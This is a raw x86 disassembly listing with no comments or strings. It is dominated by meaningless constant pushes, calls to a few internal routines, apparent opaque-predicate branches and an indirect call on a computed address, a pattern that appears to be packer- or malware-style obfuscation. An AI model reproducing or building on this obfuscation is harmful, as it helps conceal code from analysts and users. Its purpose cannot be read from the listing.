  407093:	push   0x5b
  407095:	push   0xe6ba2900
  40709a:	call   0x4095af
  40709f:	add    esp,0x14
  4070a2:	push   0xb2864f00
  4070a7:	push   0x14
  4070a9:	call   0x409350
  4070ae:	add    esp,0x8
  4070b1:	sub    ebx,edi
  4070b3:	mov    ecx,DWORD PTR [ebp-0x18]
  4070b6:	mov    eax,DWORD PTR [ebp-0x18]
  4070b9:	sub    ecx,esi
  4070bb:	call   0x409afe
  4070c0:	push   0xcc26dd00
  4070c5:	push   0x3e
  4070c7:	call   0x409afe
  4070cc:	add    esp,0x8
  4070cf:	call   0x409c22
  4070d4:	and    ebx,edi
  4070d6:	push   0xae895100
  4070db:	call   0x409c22
  4070e0:	add    esp,0x4
  4070e3:	call   0x40949f
  4070e8:	and    ebx,eax
  4070ea:	push   0xffffffba
  4070ec:	push   0x1684cf00
  4070f1:	call   0x409350
  4070f6:	add    esp,0x8
  4070f9:	push   0xffffff98
  4070fb:	push   0x45
  4070fd:	push   0x96ebc400
  407102:	call   0x409c22
  407107:	add    esp,0xc
  40710a:	test   ebx,0x3
  407110:	jne    0x4073b4
  407116:	push   0xffffffc7
  407118:	push   0x46bdcf00
  40711d:	push   0xffffffe6
  40711f:	push   0x4eeab000
  407124:	push   0xffffffae
  407126:	call   0x409167
  40712b:	add    esp,0x14
  40712e:	mov    eax,DWORD PTR [ebp-0x18]
  407131:	call   0x409c22
  407136:	push   0x7c59bd00
  40713b:	call   0x4095af
  407140:	add    esp,0x4
  407143:	push   0x49
  407145:	push   0xbaa4c900
  40714a:	push   0x7a
  40714c:	call   0x409167
  407151:	add    esp,0xc
  407154:	push   0xffffffc1
  407156:	push   0x72b6ef00
  40715b:	push   0xffffffc9
  40715d:	push   0xffffffa4
  40715f:	call   0x40949f
  407164:	add    esp,0x10
  407167:	mov    esi,DWORD PTR [ebp-0x18]
  40716a:	call   0x409350
  40716f:	or     ebx,eax
  407171:	call   0x40a101
  407176:	add    ebx,eax
  407178:	call   0x409e1d
  40717d:	push   0xffffffca
  40717f:	call   0x409c22
  407184:	add    esp,0x4
  407187:	cmp    ebx,DWORD PTR [ebp-0x4]
  40718a:	je     0x4073b4
  407190:	sub    ebx,edi
  407192:	push   0x3f
  407194:	push   0x2ebfdf00
  407199:	push   0xffffffc1
  40719b:	push   0xa6e7ff00
  4071a0:	push   0xffffff9c
  4071a2:	call   0x409afe
  4071a7:	add    esp,0x14
  4071aa:	push   0x56f3ab00
  4071af:	push   0x7e
  4071b1:	push   0x7
  4071b3:	push   0xc6a65900
  4071b8:	call   0x409c22
  4071bd:	add    esp,0x10
  4071c0:	mov    edx,esi
  4071c2:	mov    edi,DWORD PTR ds:0x43706c
  4071c8:	add    DWORD PTR [ebp-0x18],edx
  4071cb:	add    DWORD PTR [ebp-0x18],ebx
  4071ce:	push   0x24
  4071d0:	push   0x6a
  4071d2:	push   0x76
  4071d4:	push   0xc6badc00
  4071d9:	call   0x409afe
  4071de:	add    esp,0x10
  4071e1:	push   0xffffffd4
  4071e3:	push   0xffffffe8
  4071e5:	push   0xffffff95
  4071e7:	push   0x7c1fb200
  4071ec:	push   0x92cd4a00
  4071f1:	call   0x40a101
  4071f6:	add    esp,0x14
  4071f9:	push   0xffffff86
  4071fb:	push   0xffffffe4
  4071fd:	push   0xc331c00
  407202:	push   0xffffffb5
  407204:	push   0x2
  407206:	call   0x409afe
  40720b:	add    esp,0x14
  40720e:	call   0x409e1d
  407213:	cmp    eax,ebx
  407215:	jne    0x4073b4
  40721b:	sub    edi,esi
  40721d:	mov    edx,0xa417
  407222:	mov    esi,DWORD PTR [ebp-0x18]
  407225:	push   0x1eef3900
  40722a:	push   0x9e59ef00
  40722f:	push   0x9ac73900
  407234:	push   0x5f
  407236:	call   0x409167
  40723b:	add    esp,0x10
  40723e:	cmp    edi,DWORD PTR [ebp-0x38]
  407241:	jne    0x4073b4
  407247:	push   0xffffff80
  407249:	push   0xa616ce00
  40724e:	call   0x4095af
  407253:	add    esp,0x8
  407256:	push   0x35
  407258:	push   0x869a6200
  40725d:	push   0xfffffff0
  40725f:	push   0x7a8f9900
  407264:	call   0x409350
  407269:	add    esp,0x10
  40726c:	mov    edx,DWORD PTR [ebp-0x18]
  40726f:	mov    eax,DWORD PTR [ebp-0x18]
  407272:	push   0xffffff80
  407274:	call   0x409c22
  407279:	add    esp,0x4
  40727c:	cmp    edi,ebx
  40727e:	jne    0x4073b4
  407284:	mov    ebx,DWORD PTR ds:0x43705c
  40728a:	or     DWORD PTR [ebp-0x18],edi
  40728d:	mov    edx,DWORD PTR [ebp-0x18]
  407290:	push   0x4b
  407292:	push   0x3e1f1400
  407297:	push   0xaae74d00
  40729c:	push   0x4b
  40729e:	push   0xd681bd00
  4072a3:	call   0x409c22
  4072a8:	add    esp,0x14
  4072ab:	push   0x37
  4072ad:	push   0xa63ee200
  4072b2:	push   0x6c01af00
  4072b7:	call   0x40949f
  4072bc:	add    esp,0xc
  4072bf:	sub    DWORD PTR [ebp-0x18],ebx
  4072c2:	call   0x40949f
  4072c7:	cmp    esi,DWORD PTR [ebp-0x14]
  4072ca:	jne    0x4073b4
  4072d0:	push   0xffffffa3
  4072d2:	push   0xdc234c00
  4072d7:	push   0xaef7c200
  4072dc:	call   0x409e1d
  4072e1:	add    esp,0xc
  4072e4:	cmp    esi,0x24
  4072e7:	je     0x4073b4
  4072ed:	call   0x409e1d
  4072f2:	push   0x2ea78500
  4072f7:	push   0xac022b00
  4072fc:	call   0x4095af
  407301:	add    esp,0x8
  407304:	mov    ebx,edi
  407306:	mov    eax,DWORD PTR [ebp-0x18]
  407309:	add    esi,esi
  40730b:	push   0x46
  40730d:	push   0xc494a00
  407312:	push   0xb6fb8000
  407317:	push   0x66794000
  40731c:	push   0xffffffc5
  40731e:	call   0x409c22
  407323:	add    esp,0x14
  407326:	push   0x4c59a000
  40732b:	push   0xffffffd7
  40732d:	call   0x40949f
  407332:	add    esp,0x8
  407335:	sub    DWORD PTR [ebp-0x18],esi
  407338:	cmp    ebx,DWORD PTR [ebp-0x4]
  40733b:	jne    0x4073b4
  40733d:	push   0xffffffdd
  40733f:	call   0x409e1d
  407344:	add    esp,0x4
  407347:	push   0xc2c92c00
  40734c:	call   0x40949f
  407351:	add    esp,0x4
  407354:	cmp    ebx,eax
  407356:	jne    0x4073b4
  407358:	push   0xbaedab00
  40735d:	push   0x4c3e1000
  407362:	call   0x409350
  407367:	add    esp,0x8
  40736a:	push   0xa2d81900
  40736f:	push   0x6c
  407371:	push   0xffffff82
  407373:	call   0x409afe
  407378:	add    esp,0xc
  40737b:	cmp    ebx,DWORD PTR [ebp-0x3c]
  40737e:	jne    0x4073b4
  407380:	mov    ecx,0xe8
  407385:	sub    DWORD PTR [ebp-0x18],ebx
  407388:	mov    ebx,DWORD PTR [ebp-0x18]
  40738b:	cmp    ebx,DWORD PTR [ebp-0x14]
  40738e:	je     0x4073b4
  407390:	mov    edx,0xfd
  407395:	cmp    edi,0x1c5a0c01
  40739b:	je     0x4073b4
  40739d:	add    ebx,ebx
  40739f:	xor    DWORD PTR [ebp-0x18],ebx
  4073a2:	sub    DWORD PTR [ebp-0x18],edx
  4073a5:	push   0x48
  4073a7:	push   0xbae70700
  4073ac:	call   0x40a101
  4073b1:	add    esp,0x8
  4073b4:	mov    edi,0xb6
  4073b9:	mov    eax,DWORD PTR [ebp-0x18]
  4073bc:	push   0x69
  4073be:	call   0x40a101
  4073c3:	add    esp,0x4
  4073c6:	push   0x687cb00
  4073cb:	push   0x79
  4073cd:	call   0x409167
  4073d2:	add    esp,0x8
  4073d5:	push   0xe285c500
  4073da:	push   0x72decb00
  4073df:	push   0xab35400
  4073e4:	push   0xffffffc2
  4073e6:	push   0xeee23c00
  4073eb:	call   0x40949f
  4073f0:	add    esp,0x14
  4073f3:	push   0xffffffa3
  4073f5:	push   0x4
  4073f7:	push   0x13
  4073f9:	push   0x8ea0ea00
  4073fe:	push   0x48
  407400:	call   0x409afe
  407405:	add    esp,0x14
  407408:	call   0x409e1d
  40740d:	push   0xfc677e00
  407412:	push   0x7c67e200
  407417:	push   0xffffffbe
  407419:	push   0x6604eb00
  40741e:	call   0x4095af
  407423:	add    esp,0x10
  407426:	push   0x37
  407428:	push   0xffffff80
  40742a:	call   0x40949f
  40742f:	add    esp,0x8
  407432:	call   0x409350
  407437:	push   0xc2964e00
  40743c:	push   0x16
  40743e:	push   0xffffffba
  407440:	call   0x4095af
  407445:	add    esp,0xc
  407448:	call   0x409167
  40744d:	sub    DWORD PTR [ebp-0x18],esi
  407450:	xor    DWORD PTR [ebp-0x18],eax
  407453:	push   0x72991100
  407458:	push   0x4c09b400
  40745d:	push   0x1eee4a00
  407462:	push   0x55
  407464:	push   0xffffff8d
  407466:	call   0x409afe
  40746b:	add    esp,0x14
  40746e:	push   0xdada9b00
  407473:	push   0x6e
  407475:	push   0x4c639600
  40747a:	push   0x62db8b00
  40747f:	push   0xffffff88
  407481:	call   0x409afe
  407486:	add    esp,0x14
  407489:	sub    DWORD PTR [ebp-0x18],edi
  40748c:	call   DWORD PTR ds:0x4172d0
  407492:	mov    ebx,DWORD PTR ds:0x43705c
  407498:	add    ebx,esi
  40749a:	cmp    esi,eax
  40749c:	jne    0x4074ce
  40749e:	mov    ecx,DWORD PTR [ebp-0x18]
  4074a1:	cmp    ecx,0xffffffd8
  4074a4:	jne    0x4074ce
  4074a6:	sub    DWORD PTR [ebp-0x18],ebx
  4074a9:	mov    ebx,DWORD PTR [ebp-0x18]
  4074ac:	add    DWORD PTR [ebp-0x18],esi
  4074af:	mov    esi,DWORD PTR [ebp-0x18]
  4074b2:	add    DWORD PTR [ebp-0x18],ecx
  4074b5:	sub    ebx,esi
  4074b7:	sub    ebx,esi
  4074b9:	add    DWORD PTR [ebp-0x18],edi
  4074bc:	add    ebx,edi
  4074be:	cmp    ebx,DWORD PTR ds:0x43706c
  4074c4:	je     0x4074ce
  4074c6:	cmp    ebx,0xffffffa4
  4074c9:	je     0x4074ce
  4074cb:	mov    DWORD PTR [ebp-0x18],ebx
  4074ce:	test   eax,0x4824c823
  4074d3:	jne    0x40755d
  4074d9:	push   0x9aa7ce00
  4074de:	push   0x2aee1800
  4074e3:	push   0x46f0c800
  4074e8:	call   0x409e1d
  4074ed:	add    esp,0xc
  4074f0:	push   0xffffffe0
  4074f2:	push   0x6c6cee00
  4074f7:	call   0x40949f
  4074fc:	add    esp,0x8
  4074ff:	xor    edx,edx
  407501:	add    DWORD PTR [ebp-0x18],eax
  407504:	and    DWORD PTR [ebp-0x18],edx
  407507:	mov    eax,0xfb
  40750c:	cmp    ebx,0x65
  40750f:	je     0x407516
  407511:	mov    esi,edi
  407513:	xor    DWORD PTR [ebp-0x18],esi
  407516:	xor    edi,edi
  407518:	mov    DWORD PTR [ebp-0x18],edi
  40751b:	add    edx,eax
  40751d:	mov    ebx,DWORD PTR [ebp-0x18]
  407520:	sub    DWORD PTR [ebp-0x18],edx
  407523:	add    ebx,esi
  407525:	sub    DWORD PTR [ebp-0x18],ebx
  407528:	mov    edi,DWORD PTR [ebp-0x18]
  40752b:	mov    esi,DWORD PTR [ebp-0x18]
  40752e:	add    edi,edi
  407530:	add    esi,esi
  407532:	add    edi,esi
  407534:	sub    DWORD PTR [ebp-0x18],edi
  407537:	mov    DWORD PTR [ebp-0x40],edx
  40753a:	push   0x7e
  40753c:	push   0xac0f5100
  407541:	push   0xffffffd8
  407543:	call   0x409e1d
  407548:	add    esp,0xc
  40754b:	push   0x5abd8400
  407550:	push   0x684dd00
  407555:	call   0x409167
  40755a:	add    esp,0x8
  40755d:	call   0x409afe
  407562:	cmp    ebx,edi
  407564:	je     0x407586
  407566:	or     ebx,esi
  407568:	push   0x6f
  40756a:	push   0xfffffffe
  40756c:	push   0x8aef6400
  407571:	push   0x667b5e00
  407576:	call   0x409afe
  40757b:	add    esp,0x10
  40757e:	call   0x40a101
  407583:	xor    DWORD PTR [ebp-0x18],ebx
  407586:	push   0xa64f7e00
  40758b:	call   0x409afe
  407590:	add    esp,0x4
  407593:	call   DWORD PTR ds:0x4172cc
  407599:	cmp    ebx,DWORD PTR [ebp-0x4c]
  40759c:	jne    0x407626
  4075a2:	mov    ebx,edi
  4075a4:	cmp    ebx,DWORD PTR ds:0x43706c
  4075aa:	jne    0x407626
  4075ac:	or     ebx,eax
  4075ae:	mov    esi,DWORD PTR [ebp-0x18]
  4075b1:	add    DWORD PTR [ebp-0x18],ebx
  4075b4:	mov    edx,DWORD PTR ds:0x43705c
  4075ba:	add    edx,edi
  4075bc:	cmp    edi,DWORD PTR ds:0x43706c
  4075c2:	je     0x407626
  4075c4:	mov    ecx,edi
  4075c6:	mov    edi,DWORD PTR [ebp-0x18]
  4075c9:	xor    DWORD PTR [ebp-0x18],esi
  4075cc:	sub    DWORD PTR [ebp-0x18],ecx
  4075cf:	sub    DWORD PTR [ebp-0x18],edx
  4075d2:	cmp    edi,eax
  4075d4:	jne    0x407626
  4075d6:	mov    ebx,eax
  4075d8:	mov    esi,0x92
  4075dd:	or     DWORD PTR [ebp-0x18],ecx
  4075e0:	and    ebx,ecx
  4075e2:	add    edi,ebx
  4075e4:	add    esi,ecx
  4075e6:	sub    DWORD PTR [ebp-0x18],eax
  4075e9:	cmp    edi,DWORD PTR ds:0x43706c
  4075ef:	jne    0x407626
  4075f1:	mov    edx,DWORD PTR [ebp-0x18]
  4075f4:	mov    ecx,0x73
  4075f9:	add    esi,ebx
  4075fb:	add    DWORD PTR [ebp-0x18],ecx
  4075fe:	add    edx,edi
  407600:	cmp    esi,0x38e9
  407606:	je     0x407626
  407608:	and    edx,esi
  40760a:	mov    edi,0x1b3c
  40760f:	add    edi,ecx
  407611:	mov    ecx,esi
  407613:	sub    DWORD PTR [ebp-0x18],ecx
  407616:	or     edi,eax
  407618:	add    DWORD PTR [ebp-0x18],edi
  40761b:	test   edx,0x3c06304a
  407621:	jne    0x407626
  407623:	sub    DWORD PTR [ebp-0x18],edx
  407626:	mov    DWORD PTR [ebp-0x44],eax
  407629:	push   0x2c6f8300
  40762e:	push   0x9ae67300
  407633:	push   0x3a
  407635:	push   0xffffff88
  407637:	call   0x409afe
  40763c:	add    esp,0x10
  40763f:	push   0xa2be0600
  407644:	push   0xfffffff8
  407646:	push   0x2eb9ab00
  40764b:	call   0x409e1d
  407650:	add    esp,0xc
  407653:	push   0x2c67d100
  407658:	push   0x16
  40765a:	push   0x9e679100
  40765f:	call   0x4095af
  407664:	add    esp,0xc
  407667:	push   0x3f
  407669:	push   0xffffffc2
  40766b:	push   0x2abd8800
  407670:	push   0x329aa300
  407675:	call   0x409167
  40767a:	add    esp,0x10
  40767d:	push   0xffffffea
  40767f:	push   0x49
  407681:	push   0x2c
  407683:	push   0x7c582f00
  407688:	push   0xf2ff8800
  40768d:	call   0x409e1d
  407692:	add    esp,0x14
  407695:	push   0xffffffa8
  407697:	push   0x263b7000
  40769c:	push   0xffffffc6
  40769e:	push   0xffffff9c
  4076a0:	call   0x4095af
  4076a5:	add    esp,0x10
  4076a8:	call   0x4095af
  4076ad:	push   0x8c3a1200
  4076b2:	push   0x65
  4076b4:	push   0x6afbe500
  4076b9:	call   0x409afe
  4076be:	add    esp,0xc
  4076c1:	push   0x6656d000
  4076c6:	push   0x77
  4076c8:	push   0x68
  4076ca:	push   0xdea27600
  4076cf:	push   0x24
  4076d1:	call   0x4095af
  4076d6:	add    esp,0x14
  4076d9:	push   0x36c91e00
  4076de:	push   0x71
  4076e0:	call   0x40a101
  4076e5:	add    esp,0x8
  4076e8:	cmp    eax,DWORD PTR [ebp-0x4]
  4076eb:	je     0x407792
  4076f1:	mov    ebx,DWORD PTR [ebp-0x18]
  4076f4:	cmp    ebx,0x1cb8
  4076fa:	je     0x407792
  407700:	push   0x4c403600
  407705:	push   0x2c4b9e00
  40770a:	push   0x5a
  40770c:	call   0x40949f
  407711:	add    esp,0xc
  407714:	and    ebx,esi
  407716:	call   0x409c22
  40771b:	and    ebx,eax
  40771d:	push   0x54
  40771f:	push   0x8ec5d100
  407724:	push   0xa2b66100
  407729:	call   0x40a101
  40772e:	add    esp,0xc
  407731:	push   0x20
  407733:	push   0x6ef85600
  407738:	push   0x14
  40773a:	push   0x8ee71c00
  40773f:	call   0x40949f
  407744:	add    esp,0x10
  407747:	cmp    ebx,DWORD PTR [ebp-0x4c]
  40774a:	je     0x407792
  40774c:	cmp    ebx,DWORD PTR ds:0x43705c
  407752:	jne    0x407792
  407754:	cmp    ebx,DWORD PTR ds:0x43705c
  40775a:	je     0x407792
  40775c:	push   0x3e6f9000
  407761:	call   0x409c22
  407766:	add    esp,0x4
  407769:	sub    ebx,edi
  40776b:	push   0xa2a1b500
  407770:	call   0x409c22
  407775:	add    esp,0x4
  407778:	push   0xcac6fd00
  40777d:	push   0xb295e900
  407782:	call   0x409afe
  407787:	add    esp,0x8
  40778a:	call   0x4095af
  40778f:	add    DWORD PTR [ebp-0x18],ebx
  407792:	push   0x9ec01300
  407797:	push   0xffffffff
  407799:	push   0xa2d67100
  40779e:	push   0xa6e5cb00
  4077a3:	push   0x4e
  4077a5:	call   0x40949f
  4077aa:	add    esp,0x14
  4077ad:	push   0x6da3700
  4077b2:	push   0xffffffd2
  4077b4:	push   0x2
  4077b6:	push   0xa6408000
  4077bb:	call   0x40949f
  4077c0:	add    esp,0x10
  4077c3:	xor    DWORD PTR [ebp-0x18],esi
  4077c6:	call   0x40949f
  4077cb:	mov    edi,0xf8
  4077d0:	push   0x4
  4077d2:	push   0xa639d200
  4077d7:	push   0x665c7400
  4077dc:	push   0xa646e400
  4077e1:	call   0x409167
  4077e6:	add    esp,0x10
  4077e9:	call   0x409c22
  4077ee:	push   0x1ef11b00
  4077f3:	call   0x409c22
  4077f8:	add    esp,0x4
  4077fb:	test   esi,0x66
  407801:	jne    0x4078da
  407807:	push   0x5c5a3f00
  40780c:	call   0x409e1d
  407811:	add    esp,0x4
  407814:	sub    edi,esi
  407816:	mov    esi,DWORD PTR [ebp-0x18]
  407819:	push   0x9e1bd800
  40781e:	call   0x409c22
  407823:	add    esp,0x4
  407826:	call   0x409167
  40782b:	push   0x5c05ea00
  407830:	push   0x9ea44d00
  407835:	push   0x32
  407837:	call   0x409c22
  40783c:	add    esp,0xc
  40783f:	cmp    edi,ebx
  407841:	jne    0x4078da
  407847:	push   0x3e62f900
  40784c:	push   0xfffffffd
  40784e:	call   0x4095af
  407853:	add    esp,0x8
  407856:	push   0x9e17ee00
  40785b:	call   0x4095af
  407860:	add    esp,0x4
  407863:	test   eax,0xab
  407868:	jne    0x4078da
  40786a:	push   0x25
  40786c:	push   0x4aaf6000
  407871:	call   0x409afe
  407876:	add    esp,0x8
  407879:	push   0xffffffbb
  40787b:	call   0x409167
  407880:	add    esp,0x4
  407883:	mov    ebx,DWORD PTR [ebp-0x18]
  407886:	mov    ecx,DWORD PTR [ebp-0x18]
  407889:	push   0x2
  40788b:	push   0xffffff9e
  40788d:	push   0x13
  40788f:	push   0xffffffe5
  407891:	call   0x4095af
  407896:	add    esp,0x10
  407899:	cmp    ebx,esi
  40789b:	jne    0x4078da
  40789d:	add    esi,eax
  40789f:	sub    DWORD PTR [ebp-0x18],esi
  4078a2:	call   0x40a101
  4078a7:	push   0x20
  4078a9:	push   0x1ae23e00
  4078ae:	call   0x409afe
  4078b3:	add    esp,0x8
  4078b6:	mov    edx,DWORD PTR [ebp-0x18]
  4078b9:	push   0x3e303a00
  4078be:	call   0x409afe
  4078c3:	add    esp,0x4
  4078c6:	push   0xbc223600
  4078cb:	push   0xffffffe2
  4078cd:	call   0x40a101
  4078d2:	add    esp,0x8
  4078d5:	or     ebx,edi
  4078d7:	sub    DWORD PTR [ebp-0x18],ebx
  4078da:	push   0x1b
  4078dc:	call   0x40949f
  4078e1:	add    esp,0x4
  4078e4:	push   0xffffffdd
  4078e6:	push   0xffffff91
  4078e8:	push   0x6c4db900
  4078ed:	push   0x70
  4078ef:	push   0xffffff88
  4078f1:	call   0x4095af
  4078f6:	add    esp,0x14
  4078f9:	add    DWORD PTR [ebp-0x18],edi
  4078fc:	push   0x66ca9800
  407901:	push   0xffffffa1
  407903:	push   0xd6b0ae00
  407908:	push   0xffffffa7
  40790a:	push   0xffffffd0
  40790c:	call   0x4095af
  407911:	add    esp,0x14
  407914:	push   0x4c5cef00
  407919:	push   0xffffffd0
  40791b:	push   0x828ec600
  407920:	push   0x20
  407922:	push   0xdc08b600
  407927:	call   0x409167
  40792c:	add    esp,0x14
  40792f:	push   0x1e511f00
  407934:	call   0x40a101
  407939:	add    esp,0x4
  40793c:	push   0x66
  40793e:	push   0x2c6cb00
  407943:	push   0xcc485c00
  407948:	push   0x2671d500
  40794d:	push   0x6ec8ce00
  407952:	call   0x40949f
  407957:	add    esp,0x14
  40795a:	and    DWORD PTR [ebp-0x18],edi
  40795d:	push   0xffffffcc
  40795f:	push   0x20
  407961:	call   0x409c22
  407966:	add    esp,0x8
  407969:	push   0x48
  40796b:	push   0xe2822500
  407970:	push   0xffffff8c
  407972:	push   0x1c5bef00
  407977:	call   0x409350
  40797c:	add    esp,0x10
  40797f:	push   0xffffffcf
  407981:	push   0x2f
  407983:	push   0xffffffa5
  407985:	push   0x8ac59600
  40798a:	push   0x11
  40798c:	call   0x40949f
  407991:	add    esp,0x14
  407994:	mov    eax,DWORD PTR [ebp-0x18]
  407997:	xor    ecx,ecx
  407999:	call   0x40949f
  40799e:	add    edi,eax
  4079a0:	push   0xb
  4079a2:	push   0xffffffb7
  4079a4:	push   0x11
  4079a6:	call   0x409350
  4079ab:	add    esp,0xc
  4079ae:	xor    ebx,ebx
  4079b0:	push   0x8c24ef00
  4079b5:	call   0x40949f
  4079ba:	add    esp,0x4
  4079bd:	push   0x50
  4079bf:	push   0x6c5d9700
  4079c4:	push   0xea33600
  4079c9:	push   0xffffff9e
  4079cb:	push   0xa6447600
  4079d0:	call   0x409afe
  4079d5:	add    esp,0x14
  4079d8:	xor    eax,eax
  4079da:	or     DWORD PTR [ebp-0x18],ebx
  4079dd:	push   0xeab61600
  4079e2:	push   0xffffff88
  4079e4:	push   0xffffff8b
  4079e6:	push   0xffffffba
  4079e8:	push   0xec1cfa00
  4079ed:	call   0x409167
  4079f2:	add    esp,0x14
  4079f5:	push   0xb6dd7900
  4079fa:	push   0x9c773b00
  4079ff:	push   0x7aec2c00
  407a04:	push   0xffffffe0
  407a06:	call   0x40a101
  407a0b:	add    esp,0x10
  407a0e:	cmp    edi,0x440422a2
  407a14:	je     0x407a3e
  407a16:	push   0x3e044200
  407a1b:	push   0x62
  407a1d:	call   0x40949f
  407a22:	add    esp,0x8
  407a25:	push   0x663b7800
  407a2a:	push   0xdec7c100
  407a2f:	push   0x14
  407a31:	push   0xffffffc4
  407a33:	call   0x409c22
  407a38:	add    esp,0x10
  407a3b:	sub    DWORD PTR [ebp-0x18],edi
  407a3e:	sub    DWORD PTR [ebp-0x18],edi
  407a41:	push   0x4c
  407a43:	push   0xffffffca
  407a45:	call   0x40949f
  407a4a:	add    esp,0x8
  407a4d:	mov    edi,esi
  407a4f:	push   0x62b26c00
  407a54:	push   0xa2dacb00
  407a59:	call   0x40a101
  407a5e:	add    esp,0x8
  407a61:	mov    eax,edi
  407a63:	push   0xfffffff9
  407a65:	push   0xb
  407a67:	call   0x409e1d
  407a6c:	add    esp,0x8
  407a6f:	push   0x4affec00
  407a74:	push   0xfffffffa
  407a76:	push   0xffffffd3
  407a78:	push   0x3c219600
  407a7d:	push   0xc155100
  407a82:	call   0x4095af
  407a87:	add    esp,0x14
  407a8a:	lea    ecx,[ebp-0x48]
  407a8d:	sub    DWORD PTR [ebp-0x18],ecx
  407a90:	add    eax,eax
  407a92:	mov    ebx,DWORD PTR [ebp-0x18]
  407a95:	mov    edx,DWORD PTR [ebp-0x18]
  407a98:	cmp    ecx,DWORD PTR [ebp-0x18]
  407a9b:	jne    0x407b0f
  407a9d:	sub    eax,ecx
  407a9f:	add    ebx,edi
  407aa1:	or     DWORD PTR [ebp-0x18],edx
  407aa4:	mov    edx,DWORD PTR [ebp-0x18]
  407aa7:	cmp    eax,0x2
  407aaa:	je     0x407b0f
  407aac:	mov    esi,edi
  407aae:	cmp    eax,0x6ebb
  407ab3:	jne    0x407b0f
  407ab5:	add    DWORD PTR [ebp-0x18],eax
  407ab8:	mov    eax,DWORD PTR [ebp-0x18]
  407abb:	xor    edi,edi
  407abd:	test   ebx,0xe4
  407ac3:	jne    0x407b0f
  407ac5:	mov    DWORD PTR [ebp-0x18],eax
  407ac8:	sub    ebx,edi
  407aca:	add    edx,edx
  407acc:	and    DWORD PTR [ebp-0x18],esi
  407acf:	mov    eax,0x22c4114a
  407ad4:	mov    esi,DWORD PTR [ebp-0x18]
  407ad7:	test   ebx,0xe6
  407add:	jne    0x407b0f
  407adf:	mov    eax,DWORD PTR [ebp-0x18]
  407ae2:	add    esi,edx
  407ae4:	add    DWORD PTR [ebp-0x18],ebx
  407ae7:	mov    ebx,DWORD PTR [ebp-0x18]
  407aea:	cmp    eax,DWORD PTR ds:0x43706c
  407af0:	je     0x407b0f
  407af2:	mov    edx,DWORD PTR [ebp-0x18]
  407af5:	xor    edi,edi
  407af7:	and    edi,esi
  407af9:	sub    DWORD PTR [ebp-0x18],eax
  407afc:	and    edi,ebx
  407afe:	add    edx,ecx
  407b00:	add    edi,edi
  407b02:	and    edi,edx
  407b04:	cmp    edi,DWORD PTR ds:0x43705c
  407b0a:	je     0x407b0f
  407b0c:	add    DWORD PTR [ebp-0x18],edi
  407b0f:	push   ecx
  407b10:	push   0x3e52c600
  407b15:	push   0x7a
  407b17:	push   0xb
  407b19:	call   0x409c22
  407b1e:	add    esp,0xc
  407b21:	push   0x134fb096
  407b26:	mov    edi,0x4d
  407b2b:	xor    DWORD PTR [ebp-0x18],edi
  407b2e:	push   0x48
  407b30:	push   0xffffff92
  407b32:	call   0x409167
  407b37:	add    esp,0x8
  407b3a:	test   ebx,0xf3
  407b40:	je     0x407b47
  407b42:	call   0x409167
  407b47:	call   0x408154
  407b4c:	push   0x2c451400
  407b51:	push   0x5c
  407b53:	push   0x3e355400
  407b58:	call   0x409350
  407b5d:	add    esp,0xc
  407b60:	mov    ecx,DWORD PTR [ebp-0x48]
  407b63:	mov    edx,DWORD PTR [ebp-0x18]
  407b66:	sub    DWORD PTR [ebp-0x18],edx
  407b69:	shr    ecx,0x10
  407b6c:	sub    edx,ecx
  407b6e:	mov    esi,DWORD PTR [ebp-0x18]
  407b71:	and    edx,ecx
  407b73:	cmp    esi,DWORD PTR [ebp-0x34]
  407b76:	je     0x407b96
  407b78:	and    esi,ecx
  407b7a:	cmp    esi,ebx
  407b7c:	je     0x407b96
  407b7e:	xor    edi,edi
  407b80:	mov    edi,0x661f
  407b85:	or     DWORD PTR [ebp-0x18],edx
  407b88:	or     esi,edi
  407b8a:	add    esi,ebx
  407b8c:	cmp    eax,0x8c2d2105
  407b91:	je     0x407b96
  407b93:	sub    DWORD PTR [ebp-0x18],esi
  407b96:	cmp    ecx,0xacf2
  407b9c:	jne    0x407f43
  407ba2:	push   0xffffffed
  407ba4:	push   0x12
  407ba6:	push   0xffffff87
  407ba8:	call   0x409afe
  407bad:	add    esp,0xc
  407bb0:	push   0xdc505400
  407bb5:	call   0x409350
  407bba:	add    esp,0x4
  407bbd:	mov    eax,0xad32add3
  407bc2:	sub    esi,ebx
  407bc4:	add    DWORD PTR [ebp-0x18],eax
  407bc7:	add    esi,esi
  407bc9:	mov    ebx,DWORD PTR ds:0x437058
  407bcf:	mov    edx,DWORD PTR [ebp-0x18]
  407bd2:	sub    edx,ebx
  407bd4:	cmp    esi,ebx
  407bd6:	je     0x407c37
  407bd8:	or     edx,edi
  407bda:	sub    edx,ebx
  407bdc:	mov    edi,DWORD PTR [ebp-0x18]
  407bdf:	sub    DWORD PTR [ebp-0x18],esi
  407be2:	cmp    edx,edi
  407be4:	je     0x407c37
  407be6:	xor    ecx,ecx
  407be8:	add    edi,edi
  407bea:	mov    ebx,DWORD PTR [ebp-0x18]
  407bed:	add    DWORD PTR [ebp-0x18],ecx
  407bf0:	cmp    edx,DWORD PTR ds:0x437058
  407bf6:	jne    0x407c37
  407bf8:	mov    esi,0xcfb7
  407bfd:	sub    DWORD PTR [ebp-0x18],edx
  407c00:	and    ebx,esi
  407c02:	sub    edi,eax
  407c04:	cmp    edi,0xffffffcc
  407c07:	jne    0x407c37
  407c09:	add    edi,ebx
  407c0b:	xor    ecx,ecx
  407c0d:	mov    esi,DWORD PTR [ebp-0x18]
  407c10:	cmp    edi,0x20
  407c13:	je     0x407c37
  407c15:	sub    esi,edi
  407c17:	mov    edi,esi
  407c19:	mov    esi,DWORD PTR [ebp-0x18]
  407c1c:	add    edi,edi
  407c1e:	add    ecx,esi
  407c20:	and    ecx,esi
  407c22:	cmp    ebx,eax
  407c24:	jne    0x407c37
  407c26:	mov    ebx,DWORD PTR [ebp-0x18]
  407c29:	sub    DWORD PTR [ebp-0x18],ecx
  407c2c:	xor    ecx,ecx
  407c2e:	sub    DWORD PTR [ebp-0x18],ecx
  407c31:	sub    DWORD PTR [ebp-0x18],edi
  407c34:	add    DWORD PTR [ebp-0x18],ebx
  407c37:	sub    eax,DWORD PTR [ebp-0x48]
  407c3a:	cmp    eax,0x31
  407c3d:	jne    0x407c42
  407c3f:	sub    DWORD PTR [ebp-0x18],eax
  407c42:	call   eax
  407c44:	mov    ecx,0xfe2
  407c49:	mov    edi,ebx
  407c4b:	sub    edi,eax
  407c4d:	test   edi,0x8a
  407c53:	jne    0x407c67
  407c55:	add    edi,edi
  407c57:	mov    DWORD PTR [ebp-0x18],ecx
  407c5a:	add    edi,esi
